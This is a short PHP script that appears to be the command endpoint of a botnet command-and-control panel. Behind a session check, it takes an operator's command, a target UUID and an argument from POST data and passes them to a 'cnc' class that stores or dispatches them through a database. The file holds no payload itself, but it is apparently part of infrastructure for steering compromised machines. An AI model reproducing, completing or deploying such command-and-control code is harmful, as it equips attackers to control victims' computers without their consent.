<?php
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-store, no-cache, must-revalidate"); // HTTP/1.1
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache"); // HTTP/1.0
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past
session_start();
if(empty($_SESSION['auth']) || (!isset($_POST['cmd']) && key($_GET) != 'clear') || (empty($_POST['cmd']) && key($_GET) != 'clear')) {
	header('HTTP/1.0 403 Forbidden');
	die();
}
include '../sys/head.php';
$uuid = (!isset($_POST['uuid']))?'':$_POST['uuid'];
$arg = (!isset($_POST['arg']) || empty($_POST['arg']))?'N/A':$_POST['arg'];
$cmd  = strtolower($_POST['cmd']);

if(key($_GET) === 'clear') {
	header('location: ../index.php');
	$cmd = 'clear';
}

$cnc = new cnc();
echo $cnc->query($db, $cmd, $uuid, $arg);
?>
